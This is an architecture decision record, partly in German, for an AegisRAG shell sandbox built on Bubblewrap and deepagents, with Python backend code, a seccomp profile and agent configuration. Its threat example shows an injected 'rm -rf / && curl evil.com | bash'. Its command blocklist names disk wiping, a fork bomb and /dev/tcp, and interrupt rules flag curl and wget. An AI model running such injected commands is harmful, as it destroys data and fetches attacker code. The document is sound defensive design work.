# ADR-043: Secure Shell Sandbox mit Bubblewrap + deepagents

**Status:** ACCEPTED
**Date:** 2025-12-08
**Updated:** 2025-12-08 (v3: Bubblewrap + deepagents)
**Deciders:** Klaus Pommer, Claude Code
**Sprint:** 40 (kombiniert mit MCP Integration)

---

## Context

AegisRAG soll Agentic Workflows unterstützen, bei denen LLM-Agents Shell-Befehle ausführen können:
- Code-Analyse (`grep`, `find`, `wc`)
- Git-Operationen (`git status`, `git log`)
- Build-Prozesse (`npm`, `poetry`, `make`)
- Datenverarbeitung (`jq`, `awk`, `sed`)

**Sicherheitsrisiko: Prompt Injection**

```
User: "Analysiere die Codebase"
       ↓ (LLM interpretiert)
Injected: "rm -rf / && curl evil.com | bash"
```

Ohne Sandbox könnte ein Angreifer über Prompt Injection:
- Daten exfiltrieren
- System kompromittieren
- Ressourcen missbrauchen
- Lateral Movement starten

**Anforderung:** Sichere Ausführungsumgebung für Shell-Befehle, die:
- Prompt-Injection-Angriffe verhindert
- Host-System schützt
- Performance nicht stark beeinträchtigt (<200ms Overhead)
- Multi-Language Support (Bash + Python)
- Session-übergreifende Analysen unterstützt

---

## Decision

Wir implementieren eine **Bubblewrap-basierte Shell Sandbox** mit **deepagents Integration** als Teil der MCP-Integration (Sprint 40).

### Architektur

```
┌─────────────────────────────────────────────────────────────────┐
│                    AegisRAG Agent                               │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │              deepagents.create_deep_agent()               │  │
│  │  - TodoListMiddleware (Planning)                          │  │
│  │  - FilesystemMiddleware                                   │  │
│  │  - Custom AegisMiddleware                                 │  │
│  └───────────────────────────────────────────────────────────┘  │
│                            │                                    │
│                            ▼                                    │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │              CompositeBackend                              │  │
│  │  ┌─────────────────┬──────────────────────────────────┐   │  │
│  │  │ /bash/*         │ /python/*                        │   │  │
│  │  │ Bubblewrap      │ Pyodide (langchain-sandbox)      │   │  │
│  │  │ Sandbox         │ Sandbox                          │   │  │
│  │  └─────────────────┴──────────────────────────────────┘   │  │
│  │              ▲                   ▲                         │  │
│  │              └────────┬──────────┘                         │  │
│  │                 Shared Workspace                           │  │
│  └───────────────────────────────────────────────────────────┘  │
│                            │                                    │
└────────────────────────────┼────────────────────────────────────┘
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                 Bubblewrap Sandbox                              │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  Filesystem: read-only repo mount + tmpfs workspace     │    │
│  │  Network: --unshare-net (isolated)                      │    │
│  │  Capabilities: ALL dropped                              │    │
│  │  Seccomp: ~40 Syscalls whitelisted                      │    │
│  └─────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────┘
```

### Warum Bubblewrap statt Docker?

| Aspekt | Docker | Bubblewrap |
|--------|--------|------------|
| Overhead | 200-400ms (Container Start) | <50ms (Prozess-Level) |
| Isolation | Namespace + cgroups | Namespace + seccomp |
| Dependencies | Docker Daemon | Einzelnes Binary |
| Komplexität | Image Build, Registry | Inline-Konfiguration |
| ARM64 Support | Gut | Nativ |

**Entscheidung:** Bubblewrap für Bash, Pyodide für Python - leichter, schneller, gleiche Sicherheit.

### Security Layers

| Layer | Implementation | Mitigates |
|-------|---------------|-----------|
| **Network Isolation** | `--unshare-net` | Data exfiltration, C2 communication |
| **Filesystem Isolation** | `--ro-bind` repo, `--bind` workspace | Data destruction, privilege escalation |
| **Process Isolation** | Separate PID namespace | Process injection, system enumeration |
| **Resource Limits** | Timeout 30s, Memory via ulimit | DoS, resource exhaustion |
| **Capability Dropping** | `--cap-drop ALL` | Privilege escalation |
| **Seccomp Profile** | Whitelist ~40 syscalls | Kernel exploits, sandbox escape |
| **Command Validation** | Blocklist dangerous patterns | Obvious attack patterns |
| **Output Sanitization** | Truncation 32KB | Output-based attacks |
| **Audit Logging** | All executions logged | Forensics, compliance |

---

## Alternatives Considered

### Alternative 1: Docker-basierte Sandbox (v2)

**Pro:**
- Robuste Isolation
- Bekannte Toolchain
- Image-basiertes Deployment

**Contra:**
- 200-400ms Container-Start Overhead
- Docker Daemon Dependency
- Mehr Komplexität für einfache Commands

**Decision:** Nicht gewählt - Bubblewrap bietet gleiche Sicherheit bei niedrigerem Overhead.

### Alternative 2: gVisor (runsc)

**Pro:**
- User-space kernel emulation (stärkste Isolation)
- Kein Container Escape möglich
- Same Docker API

**Contra:**
- 30-50% Performance Overhead
- ARM64 Support limitiert
- Zusätzliche Runtime Dependency

**Decision:** Nicht gewählt wegen Performance Overhead und ARM64 Issues auf DGX Spark.

### Alternative 3: Firecracker MicroVMs

**Pro:**
- Stärkste Isolation (VM-level)
- Sub-second Boot Times
- Used by AWS Lambda

**Contra:**
- Requires KVM (nicht auf allen Hosts verfügbar)
- Komplexeres Setup
- Overkill für unseren Use Case

**Decision:** Nicht gewählt wegen KVM Requirement und Komplexität.

### Alternative 4: Keine Sandbox (LLM vertrauen)

**Pro:**
- Kein Performance Overhead
- Einfachere Implementierung

**Contra:**
- KRITISCHES SICHERHEITSRISIKO
- Eine Prompt Injection = vollständige Kompromittierung
- Inakzeptabel für Produktion

**Decision:** Abgelehnt - inakzeptables Sicherheitsrisiko.

---

## Rationale

**Bubblewrap + deepagents** ist optimal weil:

1. **Ausreichende Isolation:**
   - Network Isolation verhindert Exfiltration
   - Filesystem Isolation schützt Host
   - Seccomp verhindert Kernel-Exploits
   - Für Prompt Injection Protection ausreichend

2. **Hervorragende Performance:**
   - Bubblewrap Overhead: <50ms (vs Docker 200-400ms)
   - Native Prozess-Ausführung
   - Total Overhead: <200ms (Requirement erfüllt)

3. **Reduzierter Implementierungsaufwand:**
   - deepagents bietet Agent Harness (Planning, Filesystem, Subagents)
   - ~50% weniger Custom Code
   - Battle-tested (Claude Code inspiriert)
   - LLM-agnostisch (OpenAI, Anthropic, Ollama)

4. **Multi-Language Support:**
   - Bash via Bubblewrap für Filesystem-Operationen
   - Python via Pyodide für Datenverarbeitung
   - Shared Workspace für Datei-Austausch

5. **MCP-Kompatibilität:**
   - Shell als MCP Tool exponierbar
   - Einheitliche Tool-Architektur
   - Audit-Trail via MCP Logging

---

## Implementation Details

### deepagents Backend Protocol

```python
# src/components/sandbox/bubblewrap_backend.py

from deepagents.backends.protocol import (
    SandboxBackendProtocol,
    ExecuteResult,
    WriteResult,
    EditResult
)
from deepagents.backends.utils import FileInfo, GrepMatch
import subprocess
from pathlib import Path
import structlog

logger = structlog.get_logger(__name__)

class BubblewrapSandboxBackend(SandboxBackendProtocol):
    """
    Sandbox Backend using Linux Bubblewrap for process isolation.
    Implements deepagents SandboxBackendProtocol.
    """

    def __init__(
        self,
        repo_path: str,
        workspace_path: str = "/tmp/aegis-workspace",
        allowed_domains: list[str] | None = None,
        timeout: int = 30,
        seccomp_profile: str | None = None,
        output_limit: int = 32768  # 32KB
    ):
        self.repo_path = Path(repo_path).resolve()
        self.workspace = Path(workspace_path)
        self.workspace.mkdir(parents=True, exist_ok=True)
        self.allowed_domains = allowed_domains or []
        self.timeout = timeout
        self.seccomp_profile = seccomp_profile
        self.output_limit = output_limit

    def _build_bwrap_command(self, command: str) -> list[str]:
        """Build bubblewrap command with security restrictions."""
        bwrap_args = [
            "bwrap",
            # Filesystem isolation
            "--ro-bind", str(self.repo_path), "/repo",
            "--bind", str(self.workspace), "/workspace",
            "--tmpfs", "/tmp",
            "--proc", "/proc",
            "--dev", "/dev",
            # Network isolation
            "--unshare-net",
            # Drop capabilities
            "--cap-drop", "ALL",
            # Set working directory
            "--chdir", "/workspace",
        ]

        # Add seccomp profile if configured
        if self.seccomp_profile:
            bwrap_args.extend(["--seccomp", self.seccomp_profile])

        # Add command
        bwrap_args.extend(["--", "sh", "-c", command])

        return bwrap_args

    def _validate_command(self, command: str) -> None:
        """Validate command against blocklist (defense-in-depth)."""
        blocklist = [
            "rm -rf /",
            "mkfs",
            "dd if=/dev/zero",
            "> /dev/sda",
            ":(){ :|:& };:",  # Fork bomb
            "/dev/tcp/",
            "/dev/udp/",
        ]

        command_lower = command.lower()
        for pattern in blocklist:
            if pattern in command_lower:
                raise ValueError(f"Blocked command pattern: {pattern}")

    def execute(self, command: str) -> ExecuteResult:
        """Execute shell command in Bubblewrap sandbox."""
        self._validate_command(command)

        logger.info(
            "sandbox_execution_start",
            command=command[:100],
            workspace=str(self.workspace)
        )

        try:
            result = subprocess.run(
                self._build_bwrap_command(command),
                capture_output=True,
                text=True,
                timeout=self.timeout
            )

            stdout = result.stdout
            stderr = result.stderr
            truncated = False

            # Truncate if needed
            if len(stdout) > self.output_limit:
                stdout = stdout[:self.output_limit] + "\n[OUTPUT TRUNCATED]"
                truncated = True
            if len(stderr) > self.output_limit:
                stderr = stderr[:self.output_limit] + "\n[OUTPUT TRUNCATED]"
                truncated = True

            logger.info(
                "sandbox_execution_complete",
                command=command[:100],
                exit_code=result.returncode,
                truncated=truncated
            )

            return ExecuteResult(
                stdout=stdout,
                stderr=stderr,
                exit_code=result.returncode
            )

        except subprocess.TimeoutExpired:
            logger.warning(
                "sandbox_execution_timeout",
                command=command[:100],
                timeout=self.timeout
            )
            return ExecuteResult(
                stdout="",
                stderr=f"Command timed out after {self.timeout}s",
                exit_code=-1
            )

    def read(self, file_path: str, offset: int = 0, limit: int = 2000) -> str:
        """Read file from sandbox filesystem."""
        # Normalize path
        if file_path.startswith("/repo"):
            actual_path = file_path
        elif file_path.startswith("/workspace"):
            actual_path = file_path
        else:
            actual_path = f"/repo/{file_path}"

        result = self.execute(
            f"sed -n '{offset+1},{offset+limit}p' '{actual_path}'"
        )
        return result.stdout if result.exit_code == 0 else f"Error: {result.stderr}"

    def write(self, file_path: str, content: str) -> WriteResult:
        """Write file to workspace (only workspace is writable)."""
        if not file_path.startswith("/workspace"):
            return WriteResult(
                success=False,
                error="Writes only allowed in /workspace"
            )

        # Use heredoc for safe content writing
        escaped_content = content.replace("'", "'\"'\"'")
        result = self.execute(f"cat > '{file_path}' << 'AEGIS_EOF'\n{content}\nAEGIS_EOF")

        return WriteResult(
            success=result.exit_code == 0,
            error=result.stderr if result.exit_code != 0 else None
        )

    def edit(self, file_path: str, old_string: str, new_string: str) -> EditResult:
        """Edit file in workspace."""
        if not file_path.startswith("/workspace"):
            return EditResult(
                success=False,
                error="Edits only allowed in /workspace"
            )

        # Read, replace, write
        content = self.read(file_path, limit=100000)
        if old_string not in content:
            return EditResult(
                success=False,
                error=f"String not found: {old_string[:50]}..."
            )

        new_content = content.replace(old_string, new_string, 1)
        write_result = self.write(file_path, new_content)

        return EditResult(
            success=write_result.success,
            error=write_result.error
        )

    def ls_info(self, path: str = "/repo") -> list[FileInfo]:
        """List directory contents."""
        result = self.execute(f"ls -la '{path}'")
        if result.exit_code != 0:
            return []

        files = []
        for line in result.stdout.strip().split('\n')[1:]:  # Skip total line
            parts = line.split()
            if len(parts) >= 9:
                files.append(FileInfo(
                    name=parts[8],
                    size=int(parts[4]) if parts[4].isdigit() else 0,
                    is_dir=parts[0].startswith('d')
                ))
        return files

    def grep_raw(
        self,
        pattern: str,
        path: str = "/repo",
        glob: str | None = None
    ) -> list[GrepMatch] | str:
        """Search for pattern in files."""
        cmd = f"grep -rn '{pattern}' '{path}'"
        if glob:
            cmd += f" --include='{glob}'"

        result = self.execute(cmd)
        if result.exit_code not in (0, 1):  # 1 = no matches
            return f"Error: {result.stderr}"

        matches = []
        for line in result.stdout.strip().split('\n'):
            if ':' in line:
                parts = line.split(':', 2)
                if len(parts) >= 3:
                    matches.append(GrepMatch(
                        file=parts[0],
                        line_number=int(parts[1]) if parts[1].isdigit() else 0,
                        content=parts[2]
                    ))
        return matches
```

### Seccomp Profile

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "open", "openat", "close", "stat", "fstat", "lstat",
        "poll", "lseek", "mmap", "mprotect", "munmap", "brk",
        "ioctl", "access", "pipe", "select", "sched_yield",
        "dup", "dup2", "nanosleep", "getpid", "getuid", "getgid",
        "geteuid", "getegid", "getcwd", "chdir", "readlink", "readlinkat",
        "getdents", "getdents64", "fcntl", "flock", "fsync",
        "clone", "fork", "vfork", "execve", "exit", "exit_group",
        "wait4", "kill", "uname", "arch_prctl", "futex",
        "set_tid_address", "set_robust_list", "pread64", "pwrite64"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

### Agent Configuration mit deepagents

```python
# src/agents/code_analysis_agent.py

from deepagents import create_deep_agent
from deepagents.backends import CompositeBackend
from deepagents.middleware import TodoListMiddleware, FilesystemMiddleware
from langchain.chat_models import init_chat_model
from langchain_sandbox import PyodideSandbox

from src.components.sandbox.bubblewrap_backend import BubblewrapSandboxBackend

def create_code_analysis_agent(
    repo_path: str,
    model_name: str = "anthropic:claude-sonnet-4-5"
):
    """Create AegisRAG code analysis agent with deepagents."""

    # LLM (austauschbar: anthropic, openai, ollama)
    model = init_chat_model(model_name)

    # Bash Backend (Bubblewrap)
    bash_backend = BubblewrapSandboxBackend(
        repo_path=repo_path,
        timeout=30
    )

    # Python Backend (Pyodide) - optional
    python_backend = PyodideSandbox(stateful=True)

    # Composite Backend mit Shared Workspace
    backend = CompositeBackend(
        default=bash_backend,
        routes={"/python/": python_backend},
        shared_workspace="/workspace"
    )

    # Agent erstellen
    agent = create_deep_agent(
        model=model,
        backend=backend,
        system_prompt=AEGIS_ANALYSIS_PROMPT,
        interrupt_on={
            "execute_bash": {
                "patterns": ["rm -rf", "curl", "wget", "> /"],
                "allowed_decisions": ["approve", "reject"]
            }
        }
    )

    return agent

AEGIS_ANALYSIS_PROMPT = """
You are an AegisRAG code analysis agent. Your task is to analyze
codebases for documentation, architecture, and knowledge extraction.

## Execution Environments
You have two execution environments:
- Bash: Use for file navigation, grep, find, git operations
- Python: Use for data processing, JSON/YAML parsing, embeddings

Both environments share a /workspace directory for file exchange.
Choose the appropriate language based on the task.

## Session Management
At the START of each session:
1. Read /workspace/aegis-progress.json if it exists
2. Report current analysis status to user
3. Continue from where the last session stopped

At the END of each session (or when interrupted):
1. Update /workspace/aegis-progress.json with your progress
2. Document analyzed paths, extracted entities, and next steps
3. Set status to "completed" only when ALL paths are analyzed

## Progress File Format
{
    "repo": "<repo-path>",
    "status": "in_progress|completed|failed",
    "analyzed_paths": ["<paths already analyzed>"],
    "pending_paths": ["<paths still to analyze>"],
    "entities_extracted": <count>,
    "sessions": [{"timestamp": "...", "action": "..."}],
    "next_steps": ["<recommended next actions>"]
}
"""
```

### MCP Tool Integration

```python
# src/mcp_server/tools/shell.py

from src.components.sandbox.bubblewrap_backend import BubblewrapSandboxBackend

MCP_SHELL_TOOL = {
    "name": "secure_shell",
    "description": "Execute shell commands in a secure Bubblewrap sandbox. "
                   "Commands run in an isolated process with no network access. "
                   "Use for: git operations, file analysis, code inspection.",
    "inputSchema": {
        "type": "object",
        "properties": {
            "command": {
                "type": "string",
                "description": "Shell command to execute"
            },
            "workspace": {
                "type": "string",
                "description": "Path to mount as working directory (read-only)",
                "default": "/data/documents"
            },
            "timeout": {
                "type": "integer",
                "description": "Timeout in seconds",
                "default": 30,
                "maximum": 120
            }
        },
        "required": ["command"]
    }
}

async def execute_shell_tool(
    command: str,
    workspace: str = "/data/documents",
    timeout: int = 30,
    user_context: dict | None = None
) -> dict:
    """MCP tool handler for shell execution."""
    backend = BubblewrapSandboxBackend(
        repo_path=workspace,
        timeout=min(timeout, 120)
    )

    result = backend.execute(command)

    return {
        "success": result.exit_code == 0,
        "exit_code": result.exit_code,
        "stdout": result.stdout,
        "stderr": result.stderr,
        "truncated": "[OUTPUT TRUNCATED]" in result.stdout
    }
```

---

## Consequences

### Positive

- **Sichere Shell-Ausführung** - Prompt Injection kann Host nicht kompromittieren
- **Niedriger Overhead** - <200ms statt 200-400ms mit Docker
- **Multi-Language Support** - Bash + Python in einer Architektur
- **50% weniger Custom Code** - deepagents übernimmt Agent Harness
- **Session Persistence** - Progress Tracking über aegis-progress.json
- **LLM-agnostisch** - OpenAI, Anthropic, Ollama austauschbar
- **MCP-Integration** - Einheitliche Tool-Architektur

### Negative

- **Bubblewrap Dependency** - Muss auf Host installiert sein
- **Linux-only** - Bubblewrap läuft nicht auf Windows/macOS (Entwicklung in WSL/Docker)
- **Keine Persistenz zwischen Commands** - Stateless Execution (außer Workspace)
- **Limited Python Packages** - Pyodide hat nicht alle Packages

### Mitigations

- **Bubblewrap:** Standard-Package in Linux Distros, einfache Installation
- **Linux-only:** Entwicklung in WSL2, Produktion auf Linux (DGX Spark)
- **Persistenz:** Shared Workspace für Datei-Austausch
- **Python Packages:** Core-Packages verfügbar, Rest über Bash-Tools

---

## Performance Expectations

| Operation | Time |
|-----------|------|
| Bubblewrap Process Start | 20-50ms |
| Command Execution | Native (~0ms overhead) |
| Total Overhead | **<100ms** |

**Akzeptanz-Kriterium:** <200ms total overhead - ERFÜLLT (50% besser als Requirement)

---

## Security Guarantees

| Threat | Mitigation | Residual Risk |
|--------|-----------|---------------|
| Data Exfiltration | --unshare-net | Low (no egress) |
| Host Filesystem Access | --ro-bind, --bind workspace only | Low (no write outside workspace) |
| Privilege Escalation | --cap-drop ALL | Low |
| Resource Exhaustion | Timeout, ulimit | Low |
| Sandbox Escape | Seccomp profile | Very Low |
| Output-based Attacks | Truncation 32KB | Low |

**Residual Risk:** Very Low - Acceptable for production use.

---

## Dependencies

```toml
# pyproject.toml additions
[project.optional-dependencies]
sandbox = [
    "deepagents>=0.2.0",
    "langgraph>=0.4.5",
    "langgraph-codeact>=0.1.3",
    "langchain>=0.3.20",
    "langchain-sandbox>=0.0.5",  # PyodideSandbox for Python
]
```

**System Requirements:**
- Bubblewrap (`bwrap`) binary installed
- Linux kernel with namespace support

---

## Related Documents

- Sprint 40: MCP + Secure Shell Integration
- ADR-007: Model Context Protocol Client Integration
- [deepagents GitHub](https://github.com/langchain-ai/deepagents)
- [langgraph-codeact GitHub](https://github.com/langchain-ai/langgraph-codeact)
- [Bubblewrap GitHub](https://github.com/containers/bubblewrap)
- [Anthropic: Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
